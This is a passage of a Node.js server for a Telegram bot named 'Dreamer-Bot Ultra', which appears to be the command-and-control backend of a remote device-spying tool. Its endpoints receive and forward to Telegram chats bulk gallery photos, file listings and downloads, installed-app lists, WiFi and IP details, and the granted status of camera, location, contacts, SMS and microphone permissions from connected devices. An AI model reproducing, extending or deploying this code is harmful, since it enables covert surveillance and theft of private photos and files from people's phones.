    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  } finally {
    if (req.file) fs.unlinkSync(req.file.path);
  }
});

/* 6) Enhanced file listing */
app.post("/json/filelist", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, type} = req.body;
    
    // Handle different types of file responses
    if (type === "quick_access") {
      const {items} = req.body;
      const rows = items.map(item => [{
        text: item.name,
        callback_data: `file_${item.path}`
      }]);
      
      rows.push([
        {text: "📂 All Files", callback_data: "file_root"},
        {text: "🔙 Back", callback_data: "file_menu"}
      ]);
      
      await bot.editMessageText(
        "*⚡ Quick Access*\n\n" +
        "Popular folders:",
        {
          chat_id,
          message_id: msg_id,
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: rows }
        }
      );
    }
    else if (type === "directory_list") {
      const {base, page, total, items, path_display, item_count} = req.body;
      
      // Create file/folder buttons
      const rows = items.map(item => {
        const text = `${item.icon} ${item.name}${item.size ? ' (' + item.size + ')' : ''}`;
        return [{
          text: text.slice(0, 60),
          callback_data: item.dir ? `file_${item.path}` : `fileget_${item.path}`
        }];
      });
      
      // Add navigation
      const nav = [];
      if (total > 1) {
        if (page > 0) nav.push({text: "⏮️ Prev", callback_data: `filepage_${base}_${page-1}`});
        nav.push({text: `📄 ${page+1}/${total}`, callback_data: "noop"});
        if (page < total-1) nav.push({text: "Next ⏭️", callback_data: `filepage_${base}_${page+1}`});
      }
      if (nav.length) rows.push(nav);
      
      // Add controls
      const controls = [];
      if (base !== "root") controls.push({text: "⬆️ Up", callback_data: `file_${parent(base)}`});
      controls.push({text: "🏠 Root", callback_data: "file_root"});
      controls.push({text: "🔙 Menu", callback_data: "file_menu"});
      rows.push(controls);
      
      await bot.editMessageText(
        `*📂 File Explorer*\n\n` +
        `📍 ${path_display}\n` +
        `📊 ${item_count} items (${items.length} shown)\n\n` +
        `_Tap to open files/folders_`,
        {
          chat_id,
          message_id: msg_id,
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: rows }
        }
      );
    }
    
    res.json({ok: true});
  } catch (error) {
    console.error("Filelist error:", error);
    res.status(500).json({error: error.message});
  }
});

/* 7) Storage info display */
app.post("/json/storage_info", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, total, used, available, percent_used} = req.body;
    
    // Create visual storage bar
    const barLength = 20;
    const filledLength = Math.round((percent_used / 100) * barLength);
    const bar = '█'.repeat(filledLength) + '░'.repeat(barLength - filledLength);
    
    await bot.editMessageText(
      `*💾 Storage Information*\n\n` +
      `\`${bar}\` ${percent_used}%\n\n` +
      `📊 *Total:* ${total}\n` +
      `📈 *Used:* ${used}\n` +
      `📉 *Free:* ${available}\n\n` +
      `_Device: ${deviceInfo.deviceId.slice(0,6)}_`,
      {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Refresh", callback_data: "file_storage"},
            {text: "🔙 Back", callback_data: "file_menu"}
          ]]
        }
      }
    );
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 8) Gallery count with preview */
app.post("/json/gallerycount", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, folder, total, previews} = req.body;
    const lbl = folder.toLowerCase();
    
    let message = `*📸 ${folder} Gallery*\n\n`;
    message += `Total images: *${total}*\n\n`;
    
    if (previews && previews.length > 0) {
      message += `_Preview available_\n\n`;
    }
    
    message += `Select amount to retrieve:`;
    
    await bot.editMessageText(message, {
      chat_id,
      message_id: msg_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {text: "📸 Latest 10", callback_data: `gopics_${lbl}_010`},
            {text: "📸 Latest 25", callback_data: `gopics_${lbl}_025`}
          ],
          [
            {text: "📸 Latest 50", callback_data: `gopics_${lbl}_050`},
            {text: "📸 Latest 100", callback_data: `gopics_${lbl}_100`}
          ],
          [
            {text: "⚙️ Custom Amount", callback_data: `gallery_custom_${lbl}`}
          ],
          [
            {text: "🔙 Back to Gallery", callback_data: "gallery_root"}
          ]
        ]
      }
    });
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 9) Gallery photo with progress */
app.post("/gallery/photo", upload.single("img"), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const {folder, current, total} = req.body;
    
    for (const {chatId} of sessions) {
      try {
        const progress = total ? `[${current}/${total}]` : '';
        await bot.sendPhoto(chatId, fs.readFileSync(req.file.path), {
          caption: `📸 *Gallery Upload* ${progress}\n` +
                  `Folder: ${folder || 'Unknown'}\n` +
                  `Device: \`${deviceInfo.deviceId.slice(0,6)}\``,
          parse_mode: 'Markdown'
        });
      } catch (e) {
        console.error(`Gallery photo error:`, e.message);
      }
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  } finally {
    if (req.file) fs.unlinkSync(req.file.path);
  }
});

/* 10) Status updates */
app.post("/json/gallery_status", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, type, message, count, folder, error} = req.body;
    
    if (type === "upload_complete") {
      await bot.sendMessage(chat_id,
        `✅ *Upload Complete*\n\n` +
        `Successfully sent ${count} images from ${folder}\n` +
        `Device: \`${deviceInfo.deviceId.slice(0,6)}\``,
        { parse_mode: 'Markdown' }
      );
    } else if (type === "error") {
      await bot.sendMessage(chat_id,
        `❌ *Error*\n\n${error}`,
        { parse_mode: 'Markdown' }
      );
    } else if (type === "status") {
      await bot.sendMessage(chat_id,
        `ℹ️ *Status Update*\n\n${message}`,
        { parse_mode: 'Markdown' }
      );
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 11) File status endpoint */
app.post("/json/file_status", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, type, message, error} = req.body;
    
    if (type === "error") {
      await bot.sendMessage(chat_id,
        `❌ *File Operation Error*\n\n${error}`,
        { parse_mode: 'Markdown' }
      );
    } else if (type === "status") {
      await bot.sendMessage(chat_id,
        `ℹ️ ${message}`,
        { parse_mode: 'Markdown' }
      );
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 12) JSON status/error endpoints */
app.post("/json/status", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const {status} = req.body;
    
    for (const {chatId} of sessions) {
      await bot.sendMessage(chatId,
        `ℹ️ *Status Update*\n\n${status}`,
        { parse_mode: 'Markdown' }
      );
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

app.post("/json/error", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const sessions = getActiveSessions(deviceInfo.key);
    const {error} = req.body;
    
    for (const {chatId} of sessions) {
      await bot.sendMessage(chatId,
        `❌ *Error*\n\n${error}`,
        { parse_mode: 'Markdown' }
      );
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* 13) Permission checker response */
app.post("/json/permissions", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, permissions} = req.body;
    
    let message = "*🔐 Permission Status*\n\n";
    
    const permissionEmojis = {
      camera: "📸",
      location: "📍",
      contacts: "📱",
      sms: "💬",
      storage: "📂",
      phone: "📞",
      microphone: "🎤"
    };
    
    Object.entries(permissions).forEach(([perm, granted]) => {
      const emoji = permissionEmojis[perm] || "❓";
      const status = granted ? "✅ Granted" : "❌ Denied";
      message += `${emoji} ${perm}: ${status}\n`;
    });
    
    message += `\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
    
    await bot.editMessageText(message, {
      chat_id,
      message_id: msg_id,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{text: "🔄 Refresh", callback_data: "check_permissions"}],
          [{text: "🔙 Back", callback_data: "main_menu"}]
        ]
      }
    });
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* ── Utility Functions ──────────────────────────── */
function formatFileSize(bytes) {
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
  if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
  return (bytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
}

/* 14) Device Status endpoints */
app.post("/json/device_status", express.json(), async (req, res) => {
  try {
    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
    if (!deviceInfo) return res.sendStatus(403);
    
    const {chat_id, msg_id, type} = req.body;
    
    if (type === "battery_status") {
      const {battery} = req.body;
      
      // Create battery visual
      const batteryBar = getBatteryVisual(battery.percentage);
      
      await bot.editMessageText(
        `*🔋 Battery Status*\n\n` +
        `${batteryBar}\n\n` +
        `📊 *Level:* ${battery.percentage}%\n` +
        `⚡ *Status:* ${battery.status}\n` +
        `🔌 *Power Source:* ${battery.power_source}\n` +
        `🌡️ *Temperature:* ${battery.temperature}\n` +
        `⚡ *Voltage:* ${battery.voltage}\n\n` +
        `_Device: ${deviceInfo.deviceId.slice(0,6)}_`,
        {
          chat_id,
          message_id: msg_id,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [[
              {text: "🔄 Refresh", callback_data: "battery_status"},
              {text: "🔙 Back", callback_data: "device_menu"}
            ]]
          }
        }
      );
    }
    else if (type === "network_info") {
      const {network} = req.body;
      
      let message = `*📶 Network Information*\n\n`;
      message += `📡 *Connected:* ${network.connected ? '✅ Yes' : '❌ No'}\n`;
      message += `📊 *Type:* ${network.type}\n\n`;
      
      if (network.wifi) {
        message += `*WiFi Details:*\n`;
        message += `📡 *SSID:* ${network.wifi.ssid}\n`;
        message += `📶 *Signal:* ${network.wifi.signal_strength}\n`;
        message += `⚡ *Speed:* ${network.wifi.link_speed}\n`;
        message += `🌐 *IP:* \`${network.wifi.ip_address}\`\n`;
      }
      
      message += `\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Refresh", callback_data: "network_info"},
            {text: "🔙 Back", callback_data: "device_menu"}
          ]]
        }
      });
    }
    else if (type === "app_list") {
      const {total, apps} = req.body;
      
      let message = `*📱 Installed Applications*\n\n`;
      message += `Total: *${total}* apps\n`;
      message += `Showing: First 100\n\n`;
      
      // Group by system/user apps
      const userApps = apps.filter(app => !app.system);
      const systemApps = apps.filter(app => app.system);
      
      message += `*User Apps (${userApps.length}):*\n`;
      userApps.slice(0, 10).forEach(app => {
        message += `• ${app.name}\n`;
      });
      if (userApps.length > 10) {
        message += `_... and ${userApps.length - 10} more_\n`;
      }
      
      message += `\n*System Apps:* ${systemApps.length}\n`;
      message += `\n_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
      
      await bot.editMessageText(message, {
        chat_id,
        message_id: msg_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {text: "🔄 Refresh", callback_data: "app_list"},
            {text: "🔙 Back", callback_data: "device_menu"}
          ]]
        }
      });
    }
    
    res.json({ok: true});
  } catch (error) {
    res.status(500).json({error: error.message});
  }
});

/* ── Helper function for battery visual ────────── */
function getBatteryVisual(percentage) {
  const level = Math.floor(percentage / 10);
  const filled = '█'.repeat(level);
  const empty = '░'.repeat(10 - level);
  
  let emoji = '🔋';
  if (percentage <= 20) emoji = '🪫';
  else if (percentage >= 80) emoji = '🔋';
  
  return `${emoji} [${filled}${empty}] ${percentage}%`;
}

/* ── Error Handler ──────────────────────────────── */
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

/* ── Health Check ───────────────────────────────── */
app.get("/", (_, res) => {
  res.json({
    status: "OK",
    service: "Dreamer-Bot Ultra",
    version: "2.0",
    uptime: process.uptime(),
    sessions: userSessions.size,
    memory: process.memoryUsage()
  });
});

/* ── Logout handlers ────────────────────────────── */
bot.on("callback_query", async q => {
  if (q.data === "logout_confirm") {
    await bot.answerCallbackQuery(q.id);
    await bot.editMessageText(
      "*🚪 Logout Confirmation*\n\n" +
      "Are you sure you want to logout?\n\n" +
      "_Your session will be terminated_",
      {
        chat_id: q.message.chat.id,
        message_id: q.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              {text: "✅ Yes, Logout", callback_data: "logout_yes"},
              {text: "❌ Cancel", callback_data: "device_list"}
            ]
          ]
        }
      }
    );
  }
  
  if (q.data === "logout_yes") {
    const chatId = q.message.chat.id;
    userSessions.delete(chatId);
    
    await bot.answerCallbackQuery(q.id, {
      text: "✅ Logged out successfully",
      show_alert: true
    });
    
    await bot.editMessageText(
      "*👋 Goodbye!*\n\n" +
      "You have been logged out successfully.\n\n" +
      "_Use /start to login again_",
      {
        chat_id: chatId,
        message_id: q.message.message_id,
        parse_mode: 'Markdown'
      }
    );
  }
});

/* ── Start Server ───────────────────────────────── */
app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════╗
║                                            ║
║   🚀 DREAMER-BOT ULTRA v2.0               ║
║   Advanced Device Control System           ║
║                                            ║
║   Port: ${PORT}                              ║
║   Status: ACTIVE                           ║
║   Security: ENHANCED                       ║
║                                            ║
╚════════════════════════════════════════════╝
  `);
});
